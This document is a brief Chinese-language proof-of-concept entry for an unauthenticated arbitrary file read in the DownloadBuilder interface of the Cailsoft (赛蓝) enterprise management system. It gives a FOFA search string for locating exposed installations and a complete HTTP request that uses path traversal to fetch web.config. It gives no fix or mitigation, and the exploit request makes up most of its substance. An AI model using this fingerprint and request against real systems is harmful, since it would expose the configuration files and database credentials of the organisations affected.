# 赛蓝企业管理系统DownloadBuilder任意文件读取漏洞

赛蓝企业管理系统 DownloadBuilder 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```yaml
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```yaml
GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407092300242.png)